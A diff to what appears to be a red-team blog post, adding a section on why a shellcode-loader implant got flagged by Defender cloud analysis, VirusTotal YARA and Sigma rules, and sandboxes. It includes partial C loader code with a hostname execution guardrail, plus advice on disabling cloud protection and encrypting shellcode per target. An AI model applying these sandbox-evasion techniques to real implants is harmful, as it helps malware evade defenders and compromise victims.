@@ -473,6 +473,168 @@ For shits and giggles, let's check the detections on VirusTotal
 
 20/72, or **27.8%** detections. Not bad, not bad at all, but not as good as ired.team's 4.4% detection rate from 2018 xD
 
+## Sandbox Rabbithole (Reprised)
+
+About 8 hours after finishing up the first iteration of this blog post and approximately 12 hours after submitting the samples onto VT, I restarted my computer and came back to Windows Defender flagging the new executable as malicious.
+
+![hmm](https://i.gyazo.com/2b1069150a3e2082ffbeea703c76587e.png)
+
+Running the binary through `gocheck` again shows the following.
+
+![gocheck](https://i.gyazo.com/5de76c0c9d4474529c4f7b91719bc816.png)
+
+A technical overview on on how `gocheck` attempts to isolate malicious bytes in an executable can be found in another blog post I made: [Identifying Malicious Bytes in Malware](https://gatari.dev/posts/identifying-malicious-bytes-in-malware/)
+
+![hmm](https://i.gyazo.com/956d6651b0ee60324ac05762aafbc969.png)
+
+The message: "No threat detected, but the original file was flagged as malicious. The bad bytes are likely at the very end of the binary" can be slightly misleading. 
+
+When `gocheck` attempts to scan the binary, the **entire** file chunk (0-100%) is placed in a temporary folder and submitted to `MpCmdRun.exe`, and the isolation occurs when the file chunks are split into smaller and smaller pieces.
+
+The limitation occurs when the first chunk (0-100%) is flagged as malicious due to it being a **known signature**, which was determined to be malicious during _cloud analysis_ or when run in a sandbox.
+
+As a result, **the signature isn't on any particular malicious byte but on the entire file hash**
+
+### A Trip Back To The Past
+
+Let's go back to our VT scan that we run yesterday: [here](https://www.virustotal.com/gui/file/f7c88b994a9e2d52a0ddb34bb26d3a3f9da58c73e789460fcb5b5939b28e8684)
+
+![yara](https://i.gyazo.com/f98272f9cf61b5fef46e5294c25f76d4.png)
+
+Very quickly, you will see that [thor](https://www.nextron-systems.com/thor/) (an APT scanner by Nextron-Systems) had picked up on our implant and it ticked off one of their YARA rules. And, our implant hash can be found right on the rule page.
+![hmm](https://i.gyazo.com/3c23a35f10967a4f1207a72d449a842b.png)
+
+Besides being picked up by automatic scanners, we can also go over to the "Behavior" tab and see that our implant has gotten flagged by **sandboxes** as well.
+
+![sandbox](https://i.gyazo.com/3047cad3495bfcb65d60ead382494a94.png)
+
+And once again, we've ticked off even more rules; this time a Sigma rule by [@Floran Roth](https://twitter.com/cyb3rops).
+
+![sigma](https://i.gyazo.com/f1dfc7fe1ad263f5bd483ee3e6cfc59f.png)
+
+![the_rule](https://i.gyazo.com/bd14e923738f514ff1a59e4742354b1c.png)
+
+And, the sandbox picks up on our MITRE ATT&CK TTPs pretty accurately.
+
+![mtre](https://i.gyazo.com/9bd5846290f5670e6774dad05b34d9a7.png)
+
+### The Secrecy Paradox
+
+It should be obvious at this point that you probably shouldn't upload your samples onto Virus Total, however your implants **will** be under scrutiny at **some point** because of [these options](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/enable-cloud-protection-microsoft-defender-antivirus?view=o365-worldwide) on Windows Defender.
+
+![hmm](https://i.gyazo.com/bcb1080f0ae22ccbafd0646942c71849.png)
+
+You can prevent your implants from inadvertently getting nuked locally by turning these **off** and **turning off internet connection** (you can't trust Microsoft to actually turn them off). 
+
+However, when your beacons land on a target, you can't ensure that these will be disabled on their systems.
+
+![cdp](https://i.gyazo.com/7b2744b45220940e54c1aeb7b73d8a8c.png)
+
+### Guardrails & Sandbox Evasion
+
+Lots of malware use execution guardrails to constrain execution based on environment specific conditions, such as hostname or whether a device is domain joined.
+
+These are often used in engagements for scoping reasons, but can also be used for sandbox evasion. There are **literally hundreds** of guardrails and sandbox detection & evasion techniques that you can employ in your implant to constrain detonation.
+
+As an example, we'll add a guardrail based on my hostname and kill ourselves if it doesn't match. For fun, let's drop an artifact if the guardrail doesn't pass as well.
+
+```c
+void Xor( unsigned char * data, int data_len, unsigned char * key, int key_len ) {
+    for ( int i = 0; i < data_len; i++ ) {
+        data[i] = data[i] ^ key[i % key_len];
+    }
+}
+
+int GetHostname( char * hostname ) {
+    DWORD hostname_len = 32;
+    BOOL  success      = GetComputerNameA( hostname, &hostname_len );
+    return success;
+}
+
+void DropArtifact() {
+    char * filename = "C:\\Windows\\Tasks\\hello.txt";
+    char * data     = "Hmm, are a sandbox?";
+    FILE * file     = fopen( filename, "w" );
+    fwrite( data, 1, strlen( data ), file );
+    fclose( file );
+
+    return;
+}
+
+int main() {
+
+    STARTUPINFO         StartupInfo        = { 0 };
+    PROCESS_INFORMATION ProcessInfo        = { 0 };
+    LPCSTR              lpApplicationName  = "C:\\Windows\\System32\\notepad.exe";
+    LPVOID              lpAddress          = NULL;
+    PDWORD              lpflOldProtect     = NULL;
+    BOOL                StartupSuccess     = FALSE;
+    BOOL                WriteSuccess       = FALSE;
+    BOOL                ProtectSuccess     = FALSE;
+    LPSTR               Hostname           = (LPSTR)malloc( 32 );
+    BOOL                GetHostnameSuccess = FALSE;
+    LPSTR               GuardrailHostname  = (LPSTR)malloc( 32 );
+
+    GuardrailHostname[0] = 0x5A;
+    GuardrailHostname[1] = 0x41;
+    GuardrailHostname[2] = 0x56;
+    GuardrailHostname[3] = 0x49;
+    GuardrailHostname[4] = 0x45;
+    GuardrailHostname[5] = 0x52;
+
+    if ( ! ( GetHostnameSuccess = GetHostname( Hostname ) ) ) {
+        printf( "GetComputerName failed (%d).\n", GetLastError() );
+        return 1;
+    }
+
+    if ( ! ( strcmp( Hostname, GuardrailHostname ) == 0 ) ) {
+        printf( "Goodbye, let's drop an artifact too! :)\n" );
+        DropArtifact();
+        return 1;
+    }
+	...
+
+```
+
+By the way, the `GuardrailHostname` translates to `ZAVIER` in ASCII.
+```c
+int main() {
+    LPSTR GuardrailHostname  = (LPSTR)malloc( 32 );
+    GuardrailHostname[0]     = 0x5A;
+    GuardrailHostname[1]     = 0x41;
+    GuardrailHostname[2]     = 0x56;
+    GuardrailHostname[3]     = 0x49;
+    GuardrailHostname[4]     = 0x45;
+    GuardrailHostname[5]     = 0x52;
+
+    printf( "%s\n", GuardrailHostname );
+}
+```
+
+Despite being bullied by VT earlier, let's upload this onto VT once again.
+
+![vt](https://i.gyazo.com/8a40dc391a0346685f2f8f4fecf26ef3.png)
+
+Detections dropped drastically to 8/71 or **11.2%**, but let's see what the sandboxes think about it.
+
+![bruh](https://i.gyazo.com/e32dccb5f61789c121b31d81590e78e9.png)
+
+![bruh](https://i.gyazo.com/ef39c1f8e9a5868d767be3463df2a316.png)
+
+Seems like our guardrails have worked, however the simple comparison can be simply jumped over by patching the `JNE` instruction. Whether sandboxes are capable of doing this action, no one really knows lol.
+
+For better coverage, I'd recommend encrypting your shellcode with the target hostname- so that the shellcode decryption routine will error out if the hostname was incorrect.
+
+There's an extremely deep rabbithole on sandbox evasion, but here's something else that I found while scrolling around.
+
+![vm](https://i.gyazo.com/a61f4474c06c2f80fe3868048a5e682c.png)
+
+[unprotect.it](https://unprotect.it/category/sandbox-evasion/) also has a quite list of sandbox evasion techniques.
+
+### TLDR
+
+Don't upload shit onto VT, do your dev work on a VM with no internet access and always check if you're in a debugger or sandbox.
+
 ## Advice on Evasion
 
 I have been getting more into the operational side of red teaming recently, especially after doing RastaLabs and CRTO. Although writing shellcode loaders is fun, it can be _quite_ annoying when you have to make loads of them on the fly for different payloads.
